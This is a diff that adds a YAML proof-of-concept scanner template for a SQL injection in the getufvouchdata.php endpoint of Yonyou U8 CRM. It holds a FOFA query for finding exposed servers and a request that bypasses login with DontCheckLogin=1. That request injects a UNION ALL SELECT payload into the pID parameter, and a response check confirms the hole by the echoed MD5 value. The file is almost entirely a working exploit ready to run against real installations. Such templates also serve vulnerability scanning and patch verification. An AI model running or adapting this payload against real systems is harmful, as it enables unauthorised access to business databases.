@@ -1,0 +1,21 @@
+id: poc-yaml-yongyon-u8-crm-getufvouchdata-php-sqli
+info:
+  name: 用友U8 CRM getufvouchdata.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ajax/getufvouchdata.php?DontCheckLogin=1&Action=getRelations
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: PHPSESSID=bgsesstimeout-;
+  data: pID=1%27%20UNION%20ALL%20SELECT%20sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--%20uSHu&cID=1
+  expression: status_code == 200 && contains(body,"\"items\":") && contains(body,"0x"
+    + t2) && !contains(body,"<")
+transport: http
